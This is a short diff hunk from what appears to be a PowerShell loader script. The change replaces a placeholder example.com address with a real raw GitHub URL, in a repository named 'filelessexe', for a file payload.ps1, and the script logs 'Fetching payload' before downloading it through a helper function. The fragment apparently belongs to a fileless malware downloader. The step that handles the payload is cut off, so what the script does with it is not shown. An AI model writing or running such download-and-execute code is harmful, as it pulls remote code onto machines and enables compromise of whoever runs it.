@@ -29,7 +29,7 @@ function E {
 }
 
 Write-Host "[INFO] Fetching payload..."
-$u = "https://example.com/payload"  
+$u = "https://raw.githubusercontent.com/N4V33NM/filelessexe/refs/heads/main/payload.ps1"  
 $p = F -u $u
 
 if ($p) {
